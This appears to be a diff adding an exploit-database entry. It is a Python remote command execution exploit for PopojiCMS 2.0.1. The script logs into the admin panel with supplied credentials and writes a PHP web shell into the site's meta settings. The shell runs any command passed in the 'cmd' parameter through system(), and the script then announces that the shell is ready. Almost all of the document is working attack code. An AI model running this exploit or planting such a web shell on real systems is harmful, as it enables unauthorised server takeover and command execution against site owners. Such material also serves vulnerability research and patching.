@@ -1,0 +1,73 @@
+id: 39618
+date: 05/19/2024
+title: PopojiCMS 2.0.1 - Remote Command Execution Exploit
+author: Ahmet Ümit BAYRAM
+cves: 
+
+# Exploit Title: PopojiCMS 2.0.1 - Remote Command Execution
+# Exploit Author: Ahmet Ümit BAYRAM
+# Vendor Homepage: https://www.popojicms.org/
+# Software Link:
+https://github.com/PopojiCMS/PopojiCMS/archive/refs/tags/v2.0.1.zip
+# Version: Version : 2.0.1
+# Tested on: https://www.softaculous.com/apps/cms/PopojiCMS
+
+import requests
+import time
+import sys
+
+def exploit(url, username, password):
+
+login_url = f"{url}/po-admin/route.php?mod=login&act=proclogin"
+login_data = {"username": username, "password": password}
+headers = {"Content-Type": "application/x-www-form-urlencoded", "Referer": f
+"{url}/po-admin/index.php"}
+session = requests.Session()
+login_response = session.post(login_url, data=login_data, headers=headers)
+if "Administrator PopojiCMS" in login_response.text:
+print("Login Successful!")
+time.sleep(1) # 1 saniye bekle
+else:
+print("Login Failed!")
+return
+
+edit_url = f"{url}/po-admin/route.php?mod=setting&act=metasocial"
+edit_data = {"meta_content": """<html>
+<body>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form>
+<pre>
+<?php
+if(isset($_GET['cmd']))
+{
+system($_GET['cmd']);
+}
+?>
+</pre>
+</body>
+</html>"""}
+edit_response = session.post(edit_url, data=edit_data, headers=headers)
+if "cmd" in edit_response.text:
+print("Your shell is ready:", url)
+time.sleep(1)
+else:
+print("Exploit Failed!")
+return
+
+if __name__ == "__main__":
+if len(sys.argv) != 4:
+print("Kullanım: python exploit.py sitename username password")
+sys.exit(1)
+
+url = sys.argv[1]
+username = sys.argv[2]
+password = sys.argv[3]
+print("Exploiting...")
+time.sleep(1)
+print("Logging in...")
+time.sleep(1)
+exploit(url, username, password)
+
+#  0day.today [2024-05-21]  #
